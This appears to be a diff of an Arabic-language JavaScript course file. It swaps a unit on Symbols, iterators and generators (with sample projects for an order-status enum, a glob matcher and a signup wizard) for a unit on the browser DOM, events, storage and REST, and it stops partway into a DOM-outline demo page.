@@ -1,4724 +1,4577 @@
 // تكملة تاب js: الأقسام دي بتتضاف للتاب اللي اتعرّف في js/tabs/js/01.js (شرح حقول الدرس في أوله)
 MORE("js", [
     {
-      t: R`الـ Symbols والـ iteration: Symbol و Iterator والـ generators`,
-      l: 3,
-      n: "الـ Symbol كمفتاح فريد و Symbol.for، وجدول كل الـ well-known symbols، و matcher بتاعك لـ replace و split، وبروتوكول الـ iteration كامل بـ return و throw، والـ generator في الاتجاهين، و Iterator helpers و Iterator.from، والـ async generators و for await على API وملف، وعيلة AsyncFunction و GeneratorFunction، والـ function و class expressions، و void، ومشاريع: enum و glob و wizard وعميل API بصفحات وتقرير من CSV مليون سطر",
+      t: R`المتصفح بعمق: شجرة الـ DOM و window والأحداث والتخزين و REST`,
+      l: 2,
+      time: R`حوالي ٨ ساعات`,
+      n: R`انت بتعرف تجيب عنصر وتسمع على ضغطة وتعمل [[fetch]]. الوحدة دي بتوريك المتصفح نفسه من جوه: التلات objects اللي JavaScript بيشوف بيهم التاب والمتصفح والصفحة، والشجرة وإزاي تتمشى فيها وتنقل عناصرها، والطرق التلاتة تربط بيها حدث وليه واحدة منهم ممنوعة في المواقع الجادة، وإزاي الـ async كان شغال قبل Promise. وبعدين تكلّم API حقيقي بالـ ٥ methods، وتخزّن في الأماكن الأربعة وتعرف مين لإيه (ومين بيستخدمها يتتبعك)، وتحرّك العناصر من JS. وكل ده في مشروع ملاحظات كامل: سيرفر REST وصفحة وتخزين واختبارات`,
       pre: [
-        { to: "js/iterators و generators", why: R`[[Symbol.iterator]] و [[function*]] و [[yield]] في أبسط صورهم: الوحدة دي بتكمّل كل اللي فاضل` },
-        { to: "js/for...of و for...in", why: R`[[for...of]] من برّه قبل ما نشوفه من جوه` },
-        { to: "js/async و await", why: R`الـ Promises و [[await]]، أساس الـ async generators` },
-        { to: "js/valueOf و toString و Symbol.toPrimitive", why: R`أول well-known symbol اتشرح، والوحدة دي بتكمّل الجدول` },
-        { to: "js/test و match و matchAll و replace", why: R`الـ string methods اللي بنعمل لها matcher بتاعنا` },
-        { to: "js/function و arrow", why: R`function declaration و expression في أبسط صورهم` },
+        { to: "js/querySelector", why: R`تجيب عنصر، ونقطة البداية لأي مشي في الشجرة` },
+        { to: "js/addEventListener", why: R`أول طريقة تسمع بيها على حدث، وهنا الطريقتين التانيين والـ options` },
+        { to: "js/fetch و AbortController", why: R`[[fetch]] و [[res.ok]] والإلغاء، وهنا [[PUT]] و [[PATCH]] و [[DELETE]] والـ blobs` },
+        { to: "js/async و await", why: R`كل حاجة في الوحدة بتستنى: ملفات وشبكة وتخزين وanimations` },
+        { to: "js/event delegation", why: R`[[closest]] و listener واحد على الأب، في كل مشروع هنا` },
       ],
       goal: [
-        R`تستخدم [[Symbol()]] كمفتاح ميخبطش في حاجة، و [[Symbol.for]] و [[Symbol.keyFor]] لما كذا نسخة لازم تتفق، وتعرف إن الـ Symbol مستخبي مش private.`,
-        R`تعرف الـ ١٣ well-known symbol ومين بيسأل كل واحد، وتعمل class بـ [[Symbol.toStringTag]] و matcher بيشتغل مع [[str.replace]] و [[split]] و [[search]].`,
-        R`تكتب iterator بإيدك بالبروتوكول كامل ([[next]] و [[return]])، وتعرف بالظبط إمتى الـ resource بيتقفل لوحده وإمتى لأ.`,
-        R`تستخدم الـ generator كـ coroutine: [[next(value)]] و [[return]] و [[throw]] و [[yield*]] بقيمة الـ return.`,
-        R`تكتب سلاسل lazy بـ [[map]] و [[filter]] و [[take]] و [[reduce]] على أي iterator، وتعرف بالأرقام إمتى بتكسب وإمتى الـ array أسرع.`,
-        R`تكتب async generators للـ pagination والملفات، و [[for await]] بقفل صح، وتعرف [[AsyncFunction]] و [[GeneratorFunction]] وأخواتهم، وتكتب أي نوع دالة أو class كـ expression، وتستخدم [[void]] صح.`,
+        R`تعرف مين مسؤول عن إيه بين [[window]] و [[navigator]] و [[document]]، وتتمشى في شجرة الـ DOM وتنقل وتنسخ عناصرها من غير ما تقع في عقد النص.`,
+        R`تربط الأحداث بالطريقة الصح وتشيلها بـ [[signal]]، وتحوّل [[onclick="..."]] قبل ما الـ CSP يكسرها، وتلف أي callback قديم في Promise.`,
+        R`تكتب client لـ REST API بالـ ٥ methods وتتعامل مع ١٢ status code، وتجيب نص وصور مش JSON بس، وتكتب API صغير بـ [[node:http]] وتختبره بـ [[node --test]].`,
+        R`تختار بين الكوكيز و Web Storage و Cache و IndexedDB بالأرقام، وتكتب كوكيز صح من JS، وتعرف إزاي التخزين بيتستخدم في التتبع.`,
+        R`تحرّك العناصر بـ [[element.animate]] وتستنى نهايتها، وتحترم [[prefers-reduced-motion]].`,
       ],
       use: {
-        prog: R`كل مكتبة بتتعامل مع داتا على دفعات مبنية على الحاجات دي: drivers قواعد البيانات بترجّع cursors كـ async iterators، و Node streams و [[readline]] و [[events.on]] async iterables، و SDKs بتاعة APIs كتير بترجّع pagination كـ [[for await]]، و React بيعلّم عناصره بـ [[Symbol.for]]، والـ testing libraries بتعرض objects بـ [[Symbol.toStringTag]]. ولما تفهم البروتوكول هتعرف ليه ملف فضل مفتوح بعد [[break]]، وليه [[includes(/x/)]] بيرمي.`,
-        work: R`تقارير من ملفات CSV ولوجات أكبر من الذاكرة، وعملاء API بيلفوا على آلاف الصفحات وبيتلغوا، وفورم بخطوات كـ state machine، وأنواع قيم (حالات طلب، عملات) مينفعش تتلخبط مع نصوص، وأدوات بحث واستبدال بقواعد مش regex.`,
-        cs: R`lazy evaluation و streams (معالجة داتا لانهائية بذاكرة ثابتة)، و coroutines (دالة بتقف وتكمّل)، والفرق بين الـ protocol (عقد زي [[next]] و [[return]]) والـ implementation، و resource management (مين مسؤول يقفل)، والـ grammar (statement مقابل expression) في أي لغة.`,
+        prog: R`كل صفحة فيها لستة بتتعدّل، وفورم بيتحفظ، وحالة بتعيش بعد الـ reload، وطلبات لـ API، وحركة بسيطة. والباجات المشهورة هنا: [[nextSibling]] نص، و [[removeEventListener]] مبيشيلش، و [[onclick]] بيقع مع CSP، و [[JSON.parse]] على [["false"]]، وعربي في كوكي بيوصل بايظ.`,
+        work: R`لوحات تحكم ومتاجر وتطبيقات داخلية: CRUD على API، ومسودات، وتفضيلات، وإشعارات. ومراجعة كود حد تاني: توكن في [[localStorage]]، أو [[POST]] بيتعاد لوحده، أو inline handlers في موقع عليه CSP.`,
+        cs: R`الشجرة (tree) وطرق المشي فيها، و REST كأسلوب تصميم (Roy Fielding)، و idempotency في الأنظمة الموزعة، و optimistic concurrency بالـ version (الـ 409 في مشروع الملاحظات)، والخصوصية والتتبع.`,
       },
       projects: [
-        { lvl: 'صغير', t: R`enum حالات الطلب بـ Symbols`, what: R`[[order-status.mjs]] فيه [[Status]] متجمّد فيه ٥ حالات قيمهم Symbols ([[PENDING]] و [[PAID]] و [[SHIPPED]] و [[DELIVERED]] و [[CANCELLED]])، وجدول انتقالات مسموحة في [[Map]] مفاتيحه Symbols، و [[createOrder(id)]] بـ [[moveTo(status)]] بيرفض الانتقال الغلط وبيرفض النص ([['delivered']]) بدل الـ Symbol، و [[toJSON]] بيكتب الحالة نص بـ [[description]]، و [[parseStatus(name)]] بترجّعها Symbol. من دروس «Symbol: description و Symbol.for و Symbol.keyFor» و «well-known symbols».`, done: R`الطلب بيمشي pending ثم paid ثم shipped والـ JSON فيه [[history]] نصوص، و shipped لـ cancelled بيترفض برسالة، و [[moveTo('delivered')]] بيترفض بـ TypeError بتقول إنه نص، و [[order.status === Symbol('delivered')]] بـ [[false]]، و [[parseStatus]] بعد JSON بيرجّع نفس الـ Symbol، و [[Status.PAID = ...]] بيرمي.`, sol: R`**هتشوف إيه:** سطر لكل حالة: الطلب بعد خطوتين كـ JSON، ورفضين برسالتهم، والمقارنات، والرجوع من JSON:
+        { lvl: 'صغير', dir: "dom-outline", t: R`شجرة الصفحة كنص`, what: R`صفحة فيها منيو كافيه متداخل (عنوان، ولستة جواها لستة، وتعليق HTML)، وتحتها [[<pre>]] بيرسم شجرة المنيو بالخطوط ([[├─]] و [[└─]]) بدالة recursive، و checkbox «اعرض الـ text nodes والتعليقات» بيبدّل بين [[children]] و [[childNodes]]، وتحت الشجرة العدد. ولما تدوس على أي عنصر في المنيو يتعلّم عليه ويتكتب: اسمه، وأبوه، وعدد إخواته وأولاده، وأقرب [[li]] ليه بـ [[closest]]. من درس «شجرة الـ DOM».`, done: R`الشجرة من غير النصوص فيها ٧ عناصر تحت الـ [[nav]]، ومع النصوص ٢٠ عقدة وباين فيها [[\n]] والتعليق، والضغط على «شاي» بيكتب «الأب: ul | إخواته: 1 | أقرب li: شاي»، وعلى العنوان «أقرب li: مفيش».`, sol: R`## الشكل النهائي
 
-~~~text الناتج: node order-status.mjs
-{"id":"A-17","status":"shipped","history":["pending","paid","shipped"]}
-رفض: ممنوع من shipped لـ cancelled
-رفض: moveTo محتاجة حالة من Status، مش string: "delivered"
-true false Symbol(delivered)
-true
-TypeError: حالة مش معروفة: "lost" (المسموح: pending, paid, shipped, delivered, cancelled)
-TypeError: Cannot assign to read only property 'PAID' of object '#<Object>'
-~~~
+~~~live 560 index.html
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>شجرة الصفحة</title>
+<style>
+  body { font: 15px/1.6 system-ui, sans-serif; margin: 16px; }
+  #sample { border: 1px dashed #999; padding: 8px 12px; border-radius: 6px; }
+  pre { direction: ltr; text-align: left; background: #f3f4f6; padding: 10px; border-radius: 6px; overflow-x: auto; font-size: 13px; }
+  .picked { outline: 2px solid #0b6e4f; }
+</style>
+</head>
+<body>
+<nav id="sample" aria-label="منيو الكافيه">
+  <h2>المنيو</h2>
+  <ul>
+    <li>مشروبات سخنة
+      <ul><li>قهوة</li><li>شاي</li></ul>
+    </li>
+    <li>حلويات <!-- قريب: تشيز كيك --></li>
+  </ul>
+</nav>
+<p>
+  <label><input type="checkbox" id="text"> اعرض الـ text nodes والتعليقات</label>
+</p>
+<p id="info">دوس على أي عنصر في المنيو تشوف أهله وإخواته.</p>
+<pre id="out"></pre>
+<script>
+const sample = document.querySelector("#sample");
+const out = document.querySelector("#out");
+const info = document.querySelector("#info");
 
-~~~js order-status.mjs
-// node order-status.mjs: حالات الطلب كـ Symbols، والانتقالات المسموحة، والتحويل من وإلى JSON
-const Status = Object.freeze({
-  PENDING: Symbol('pending'),
-  PAID: Symbol('paid'),
-  SHIPPED: Symbol('shipped'),
-  DELIVERED: Symbol('delivered'),
-  CANCELLED: Symbol('cancelled'),
-});
-
-const byName = new Map(Object.values(Status).map((s) => [s.description, s]));
-
-const transitions = new Map([
-  [Status.PENDING, [Status.PAID, Status.CANCELLED] ],
-  [Status.PAID, [Status.SHIPPED, Status.CANCELLED] ],
-  [Status.SHIPPED, [Status.DELIVERED] ],
-  [Status.DELIVERED, [] ],
-  [Status.CANCELLED, [] ],
-]);
-
-function parseStatus(name) {
-  const s = byName.get(name);
-  if (!s) throw new TypeError('حالة مش معروفة: ' + JSON.stringify(name) + ' (المسموح: ' + [...byName.keys()].join(', ') + ')');
-  return s;
+// اسم العقدة في سطر: العناصر باسمها، والنص بين علامات تنصيص، والتعليق بـ <!-- -->
+function label(node) {
+  if (node.nodeType === Node.ELEMENT_NODE) return node.localName + (node.id ? "#" + node.id : "");
+  if (node.nodeType === Node.TEXT_NODE) return JSON.stringify(node.nodeValue);
+  if (node.nodeType === Node.COMMENT_NODE) return "<!--" + node.nodeValue + "-->";
+  return node.nodeName;
 }
 
-function createOrder(id) {
-  let status = Status.PENDING;
-  const history = [status];
-  return {
-    id,
-    get status() { return status; },
-    moveTo(next) {
-      if (typeof next !== 'symbol') throw new TypeError('moveTo محتاجة حالة من Status، مش ' + typeof next + ': ' + JSON.stringify(next));
-      if (!(transitions.get(status) ?? []).includes(next)) {
-        throw new Error('ممنوع من ' + status.description + ' لـ ' + next.description);
-      }
-      status = next;
-      history.push(next);
-      return this;
-    },
-    toJSON() { return { id, status: status.description, history: history.map((s) => s.description) }; },
-  };
+// بنمشي الشجرة بالـ recursion: كل عقدة سطر، وأولادها تحتها بمسافة أكبر
+function outline(node, withText, prefix = "", last = true, lines = []) {
+  lines.push(prefix + (prefix ? (last ? "└─ " : "├─ ") : "") + label(node));
+  const kids = [...(withText ? node.childNodes : node.children)];
+  kids.forEach((kid, i) => outline(kid, withText, prefix + (prefix ? (last ? "   " : "│  ") : " "), i === kids.length - 1, lines));
+  return lines;
 }
 
-const order = createOrder('A-17');
-order.moveTo(Status.PAID).moveTo(Status.SHIPPED);
-console.log(JSON.stringify(order));
-try { order.moveTo(Status.CANCELLED); } catch (e) { console.log('رفض:', e.message); }
-try { order.moveTo('delivered'); } catch (e) { console.log('رفض:', e.message); }
-order.moveTo(Status.DELIVERED);
-console.log(order.status === Status.DELIVERED, order.status === Symbol('delivered'), String(order.status));
-const saved = JSON.parse(JSON.stringify(order));
-console.log(parseStatus(saved.status) === Status.DELIVERED);
-try { parseStatus('lost'); } catch (e) { console.log(e.name + ':', e.message); }
-try { Status.PAID = Symbol('hacked'); console.log('اتغيّر؟', Status.PAID.description); } catch (e) { console.log(e.name + ':', e.message); }
-
-export { Status, parseStatus, createOrder };
-~~~
-
-~~~json package.json
-{ "type": "module" }
-~~~
-
-**كل حتة بتعمل إيه:**
-
-- [[Object.freeze({ PENDING: Symbol('pending'), ... })]]: كل قيمة Symbol فريد، والوصف ([['pending']]) هو اللي هيتكتب في الـ JSON. والـ freeze بيمنع حد يغيّر [[Status.PAID]] (آخر سطر في الناتج: [[Cannot assign to read only property]] لأن ملفات [[.mjs]] strict).
-- [[byName]]: [[Map]] من الوصف للـ Symbol، عشان نرجع من الـ JSON. اتبنت من [[Object.values(Status)]] فمفيش اسم بيتكتب مرتين.
-- [[transitions]]: [[Map]] مفاتيحه Symbols (ده اللي [[Map]] بيقدر عليه و object عادي برضه، بس [[Map]] أوضح ومش بيخلط مع خصايص موروثة).
-- [[moveTo]]: أول فحص [[typeof next !== 'symbol']]، وبعدين [[includes]] على الانتقالات المسموحة (الـ [[===]] على Symbols = نفس الهوية).
-- [[toJSON]]: [[JSON.stringify]] بيرمي الـ Symbols (درس Symbol)، فلازم نحوّلها نص بإيدنا بـ [[description]].
-- [[order.status === Symbol('delivered')]] بـ [[false]]: ده الهدف كله. محدش يقدر «يألّف» حالة صح من برّه الـ module، لازم ياخدها من [[Status]].
-
-**الغلطات اللي حصلت وأنا ببنيه:**
-
-1. أول نسخة مكنش فيها فحص [[typeof]]، و [[moveTo('delivered')]] طلّعت [[رفض: ممنوع من shipped لـ delivered]]: رسالة بتقول إن الانتقال ممنوع، والحقيقة إن الحالة نفسها **نص** مش من [[Status]]، وكانت هتترفض حتى من [[PAID]]. الفحص بقى أول سطر برسالة واضحة.
-2. آخر سطر كان [[console.log(e.name)]] بس فطبع [[TypeError]] من غير سبب؛ زوّدت [[e.message]] عشان الناتج يشرح نفسه.
-
-**وليه مش نصوص عادية ([['paid']])؟** النص بيتكتب غلط ([['payed']]) ويعدّي، وبيتقارن مع أي نص تاني جاي من يوزر. الـ Symbol بيجبرك تمشي من [[Status]]، والنص بيفضل على حدود البرنامج بس (JSON و قاعدة البيانات) بـ [[parseStatus]] اللي بترفض أي حاجة مش معروفة.` },
-        { lvl: 'صغير', t: R`glob matcher بيشتغل مع replace و split`, what: R`[[glob.mjs]] فيه [[class Glob]]: [[new Glob('*.js')]] أو [[new Glob('report-??.csv')]] ([[*]] = أي حروف في الاسم، و [[?]] = حرف واحد، والباقي حرفي حتى [[.]] و [[+]]). عنده [[test(name)]]، وبيتبعت لـ [[str.search]] و [[str.replace]] (بنص أو بدالة) و [[str.split]] زي الـ regex بالظبط، وليه [[Symbol.toStringTag]]. من دروس «RegExp و Symbol.match و Symbol.replace: matcher بتاعك» و «well-known symbols».`, done: R`[[*.js]] بيطابق [[app.js]] و [[app.test.js]] ومش [[src/app.js]]، و [[report-??.csv]] بيطابق [[report-01.csv]] ومش [[report-2026.csv]]، و [[replace]] بيغيّر الـ ٣ ملفات js في السطر، و [[split]] بيطلّع اللي مش js، و [[new Glob('a+b.js')]] بيطابق [[a+b.js]] حرفيًا ومش [[aab.js]]، و [[String(js)]] بـ [[[object Glob *.js]]].`, sol: R`**هتشوف إيه:** الفلترة على أسامي ملفات، وبعدين الـ string methods على سطر فيه ملفات:
-
-~~~text الناتج: node glob.mjs
-[ 'app.js', 'app.test.js' ]
-[ 'report-01.csv' ]
-0 -1
-[js] style.css [js] notes.txt [js]
-APP.JS style.css APP.TEST.JS notes.txt OLD.JS
-[ 'style.css', 'notes.txt' ]
-[object Glob *.js] ok aab.js
-includes: false
-TypeError: Glob محتاج pattern نصي مش فاضي
-~~~
-
-~~~js glob.mjs
-// node glob.mjs: glob زي *.js و report-??.csv بيشتغل مع test و search و replace و split
-export class Glob {
-  #source;
-  constructor(pattern) {
-    if (typeof pattern !== 'string' || pattern === '') throw new TypeError('Glob محتاج pattern نصي مش فاضي');
-    this.pattern = pattern;
-    const body = [...pattern].map((ch) => (ch === '*' ? '[^\\s/]*' : ch === '?' ? '[^\\s/]' : RegExp.escape(ch))).join('');
-    this.#source = '(?<!\\S)' + body + '(?!\\S)';
-  }
-  #regex() { return new RegExp(this.#source, 'g'); }
-  test(name) { return new RegExp('^' + this.#source + '$').test(name); }
-  [Symbol.search](str) { return str.search(this.#regex()); }
-  [Symbol.replace](str, rep) { return str.replace(this.#regex(), rep); }
-  [Symbol.split](str, limit) { return str.split(this.#regex(), limit).map((s) => s.trim()).filter(Boolean); }
-  get [Symbol.toStringTag]() { return 'Glob ' + this.pattern; }
+function draw() {
+  const withText = document.querySelector("#text").checked;
+  const lines = outline(sample, withText);
+  out.textContent = lines.join("\n") + "\n\n" + (lines.length - 1) + (withText ? " عقدة" : " عنصر") + " تحت الـ nav";
 }
 
-const files = ['app.js', 'app.test.js', 'style.css', 'report-01.csv', 'report-2026.csv', 'src/app.js', 'notes.txt'];
-const js = new Glob('*.js');
-const report = new Glob('report-??.csv');
-console.log(files.filter((f) => js.test(f)));
-console.log(files.filter((f) => report.test(f)));
-const listing = 'app.js style.css app.test.js notes.txt old.js';
-console.log(listing.search(js), listing.search(new Glob('*.md')));
-console.log(listing.replace(js, '[js]'));
-console.log(listing.replace(js, (name) => name.toUpperCase()));
-console.log(listing.split(js));
-console.log(String(js), 'a+b.js'.replace(new Glob('a+b.js'), 'ok'), 'aab.js'.replace(new Glob('a+b.js'), 'ok'));
-try { console.log('includes:', listing.includes(js)); } catch (e) { console.log(e.message); }
-try { new Glob(''); } catch (e) { console.log(e.name + ':', e.message); }
-~~~
-
-~~~json package.json
-{ "type": "module" }
-~~~
-
-**كل حتة بتعمل إيه:**
-
-- الـ constructor بيحوّل الـ glob لـ regex **من جوه**: [[*]] بقت [[[^\s/]*]] (أي حروف ماعدا المسافة و [[/]])، و [[?]] بقت [[[^\s/]]]، وأي حرف تاني بيعدّي على [[RegExp.escape]] فـ [[.]] و [[+]] بيبقوا حرفيين.
-- [[(?<!\S)]] و [[(?!\S)]]: lookbehind و lookahead معناهم «قبلي وبعدي مسافة أو أول وآخر النص»، عشان [[*.js]] متمسكش حتة من كلمة. و [[\S]] الكبيرة = أي حاجة مش مسافة.
-- [[#regex()]] بيعمل regex جديد كل نداء: الـ regex بـ [[g]] ليه [[lastIndex]] بيتغيّر، ولو استخدمنا واحد مشترك هيبوظ بين النداءات.
-- [[ [Symbol.search] ]] و [[ [Symbol.replace] ]] و [[ [Symbol.split] ]]: بيسلّموا للـ regex الداخلي. ومفيش [[Symbol.match]] بقصد: عشان كده [[listing.includes(js)]] **مرماش** error ورجّع [[false]] (حوّل الـ Glob لنص [['[object Glob *.js]']] ودوّر عليه). لو كنا زوّدنا [[Symbol.match]] كان هيرمي.
-- [[split]] بيعمل [[trim]] ويشيل الفاضي، لأن الـ regex بياكل الاسم بس ويسيب المسافات حواليه.
-
-**الغلطات اللي حصلت وأنا ببنيه:**
-
-أول نسخة كان فيها [['[^\s/]*']] بـ backslash **واحدة** جوه string عادي. في JavaScript [['\s']] جوه string = [['s']] (escape ملوش معنى بيتشال)، فالـ regex بقى [[[^s/]*]] يعني «أي حرف غير s»:
-
-~~~text الناتج من النسخة الأولى
-[ 'app.js' ]
-[ 'report-01.csv' ]
-34 -1
-app.js style.css app.test.js notes[js]
-~~~
-
-[[app.test.js]] مطابقش (فيه [[s]] في test)، و [[replace]] مسك [[.txt old.js]] كأنها اسم واحد لأن المسافة بقت مسموحة. الحل: [['[^\\s/]*']] (backslash مضاعفة جوه الـ string) أو [[String.raw]]. وطبعت [[body]] قبل [[new RegExp]] عشان أشوف الـ regex الحقيقي، وده أسرع طريقة تلاقي الغلط ده.` },
-        { lvl: 'متوسط', t: R`فورم تسجيل بخطوات كـ generator`, what: R`[[wizard.mjs]] فيه [[function* signupWizard()]]: كل [[yield]] سؤال ([[{ field, question, error }]])، و [[next(answer)]] الإجابة، وكل سؤال بيتسأل تاني برسالة لو الإجابة غلط، ولو الباقة [[pro]] بيسأل عن آخر ٤ أرقام من الكارت. [[throw(new CancelError())]] = اليوزر لغى (بيرجّع الحقول اللي اتملت)، و [[return]] لو الإدخال خلص. و [[demo.mjs]] بيجرّبه بإجابات مكتوبة، و [[cli.mjs]] بياخد الإجابات من الكيبورد أو pipe بـ [[for await]] على [[readline]]. من دروس «Generator: next و return و throw و yield*» و «AsyncIterator و async generators».`, done: R`التسجيل بـ ٤ إجابات غلط بيطلّع الرسالة الصح لكل واحدة ويكمّل، والنتيجة فيها [[card: '****1234']]، و free مبيسألش عن الكارت، والإلغاء عند الإيميل بيرجّع [[filled: [ 'name' ] ]]، و [[[wizard closed]]] بيتطبع في الـ ٤ حالات، و [[printf 'Sara\ncancel\n' | node cli.mjs]] بيلغي.`, sol: R`**هتشوف إيه:** كل سؤال وإجابته، والإجابة الغلط بتظهر قبلها ✗ والسبب، وفي الآخر النتيجة:
-
-~~~text الناتج: node demo.mjs
-== تسجيل كامل بـ pro وغلطتين
-اسمك؟ "S"
-  ✗ الاسم حرفين على الأقل ← اسمك؟ "Sara"
-إيميلك؟ "sara@"
-  ✗ إيميل مش صح ← إيميلك؟ "sara@example.com"
-الباقة (free أو pro)؟ "gold"
-  ✗ اختار free أو pro ← الباقة (free أو pro)؟ "pro"
-آخر ٤ أرقام من الكارت؟ "12a4"
-  ✗ لازم ٤ أرقام ← آخر ٤ أرقام من الكارت؟ "1234"
-  [wizard closed]
-{
-  ok: true,
-  account: {
-    name: 'Sara',
-    email: 'sara@example.com',
-    plan: 'pro',
-    card: '****1234'
-  }
-}
-== free من غير كارت
-اسمك؟ "Omar"
-إيميلك؟ "omar@example.org"
-الباقة (free أو pro)؟ "free"
-  [wizard closed]
-{
-  ok: true,
-  account: { name: 'Omar', email: 'omar@example.org', plan: 'free' }
-}
-== إلغاء عند الإيميل
-اسمك؟ "Mona"
-إيميلك؟ [إلغاء]
-  [wizard closed]
-{ ok: false, reason: 'اليوزر داس إلغاء عند email', filled: [ 'name' ] }
-== الإجابات خلصت
-اسمك؟ "Ali"
-  [wizard closed]
-{ ok: false, reason: 'الإجابات خلصت قبل الأسئلة' }
-~~~
-
-~~~js wizard.mjs
-// wizard.mjs: فورم تسجيل خطوة خطوة كـ generator: كل yield سؤال، و next(answer) إجابة
-export class CancelError extends Error { name = 'CancelError'; }
-
-const ask = (field, question, validate) => ({ field, question, validate });
-
-const steps = [
-  ask('name', 'اسمك؟', (v) => (v.trim().length >= 2 ? null : 'الاسم حرفين على الأقل')),
-  ask('email', 'إيميلك؟', (v) => (/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i.test(v) ? null : 'إيميل مش صح')),
-  ask('plan', 'الباقة (free أو pro)؟', (v) => (['free', 'pro'].includes(v) ? null : 'اختار free أو pro')),
-];
-
-export function* signupWizard() {
-  const answers = {};
-  try {
-    for (const step of steps) {
-      let error = null;
-      while (true) {
-        const raw = yield { field: step.field, question: step.question, error };
-        const value = String(raw ?? '');
-        error = step.validate(value);
-        if (!error) { answers[step.field] = value.trim(); break; }
-      }
-      if (step.field === 'plan' && answers.plan === 'pro') {
-        let error = null;
-        while (true) {
-          const card = yield { field: 'card', question: 'آخر ٤ أرقام من الكارت؟', error };
-          if (/^\d{4}$/.test(String(card))) { answers.card = '****' + card; break; }
-          error = 'لازم ٤ أرقام';
-        }
-      }
-    }
-    return { ok: true, account: answers };
-  } catch (e) {
-    if (e instanceof CancelError) return { ok: false, reason: e.message, filled: Object.keys(answers) };
-    throw e;
-  } finally {
-    console.log('  [wizard closed]');
-  }
-}
-
-export function runScripted(answers, { cancelAt } = {}) {
-  const wizard = signupWizard();
-  let step = wizard.next();
-  for (const answer of answers) {
-    if (step.done) break;
-    const { field, question, error } = step.value;
-    const shown = field === cancelAt ? '[إلغاء]' : JSON.stringify(answer);
-    console.log((error ? '  ✗ ' + error + ' ← ' : '') + question + ' ' + shown);
-    step = field === cancelAt ? wizard.throw(new CancelError('اليوزر داس إلغاء عند ' + field)) : wizard.next(answer);
-  }
-  if (!step.done) step = wizard.return({ ok: false, reason: 'الإجابات خلصت قبل الأسئلة' });
-  return step.value;
-}
-~~~
-
-~~~js demo.mjs
-// node demo.mjs: بيجرّب الـ wizard بإجابات مكتوبة
-import { runScripted } from './wizard.mjs';
-console.log('== تسجيل كامل بـ pro وغلطتين');
-console.log(runScripted(['S', 'Sara', 'sara@', 'sara@example.com', 'gold', 'pro', '12a4', '1234']));
-console.log('== free من غير كارت');
-console.log(runScripted(['Omar', 'omar@example.org', 'free']));
-console.log('== إلغاء عند الإيميل');
-console.log(runScripted(['Mona', 'x'], { cancelAt: 'email' }));
-console.log('== الإجابات خلصت');
-console.log(runScripted(['Ali']));
-~~~
-
-~~~js cli.mjs
-// node cli.mjs: نفس الـ wizard بس الإجابات سطر سطر من الكيبورد أو من pipe، و "cancel" بتلغي
-import { createInterface } from 'node:readline';
-import { signupWizard, CancelError } from './wizard.mjs';
-const rl = createInterface({ input: process.stdin, crlfDelay: Infinity });
-const wizard = signupWizard();
-let step = wizard.next();
-const prompt = ({ question, error }) => process.stdout.write((error ? '✗ ' + error + '\n' : '') + question + ' ');
-prompt(step.value);
-for await (const line of rl) {
-  step = line === 'cancel' ? wizard.throw(new CancelError('cancel')) : wizard.next(line);
-  if (step.done) break;
-  prompt(step.value);
-}
-if (!step.done) step = wizard.return({ ok: false, reason: 'الإدخال خلص' });
-console.log('\n' + JSON.stringify(step.value));
-~~~
-
-~~~json package.json
-{ "type": "module" }
-~~~
-
-~~~text الناتج: الـ CLI بإدخال من pipe (Git Bash)
-$ printf 'Sara\nsara@example.com\npro\n9876\n' | node cli.mjs
-اسمك؟ إيميلك؟ الباقة (free أو pro)؟ آخر ٤ أرقام من الكارت؟   [wizard closed]
-
-{"ok":true,"account":{"name":"Sara","email":"sara@example.com","plan":"pro","card":"****9876"}}
-$ printf 'Sara\nnope\ncancel\n' | node cli.mjs
-اسمك؟ إيميلك؟ ✗ إيميل مش صح
-إيميلك؟   [wizard closed]
-
-{"ok":false,"reason":"cancel","filled":["name"]}
-$ printf 'Sara\n' | node cli.mjs
-اسمك؟ إيميلك؟   [wizard closed]
-
-{"ok":false,"reason":"الإدخال خلص"}
-~~~
-
-**كل حتة بتعمل إيه:**
-
-- [[const raw = yield { field, question, error }]]: السطر ده هو الفورم كله. بيطلّع السؤال (ومعاه رسالة الغلط اللي فاتت لو فيه)، ويستنى، والإجابة بترجع في [[raw]]. والـ [[while (true)]] بيعيد نفس السؤال لحد ما [[validate]] ترجّع [[null]].
-- السؤال الإضافي للكارت جوه الـ [[for]] بعد خطوة [[plan]]: الـ flow متفرّع وهو مكتوب كود عادي، من غير [[state]] و [[switch]].
-- [[catch (e)]] بيفرّق: [[CancelError]] = إلغاء مقصود فبيرجّع نتيجة، وأي error تاني بيترمي تاني ([[throw e]]) عشان الغلطات الحقيقية متتبلعش.
-- [[finally]]: بتطبع [[[wizard closed]]] في الخلاص والإلغاء و [[return]] من برّه.
-- [[runScripted]]: هو اللي «بيلف»: أول [[next()]] من غير قيمة (priming)، وبعدين [[next(answer)]] أو [[throw]]، ولو الإجابات خلصت [[return]] بنتيجة.
-- [[cli.mjs]]: نفس الـ generator، بس الإجابات من [[for await (const line of rl)]]. الـ generator مش فارق معاه الإجابة جت منين.
-
-**الغلطات اللي حصلت وأنا ببنيه:**
-
-أول [[cli.mjs]] كان بـ [[readline/promises]] و [[await rl.question(...)]] في loop. بالكيبورد شغال، بس بـ pipe:
-
-~~~text الناتج من النسخة الأولى: printf 'Sara\nsara@example.com\npro\n9876\n' | node cli.mjs
-اسمك؟ إيميلك؟ Warning: Detected unsettled top-level await at file:///.../cli.mjs:10
-    const answer = await rl.question((error ? '✗ ' + error + '\n' : '') + question + ' ');
-                   ^
-
-exit 13
-~~~
-
-الـ pipe بيبعت السطور كلها مرة واحدة، و [[question]] بياخد السطر اللي بييجي **بعد** ما يتنادى، فالسطور اللي وصلت وهو مش سائل ضاعت، والـ input خلص والـ [[await]] فضل مستني للأبد، فـ Node خرج بـ 13 (unsettled top-level await). الحل: [[for await (const line of rl)]] بيستلم كل سطر في طابور، ونحركه للـ generator واحد واحد. ده اللي في الكود فوق، والتلات تجارب بالـ pipe عدّت.` },
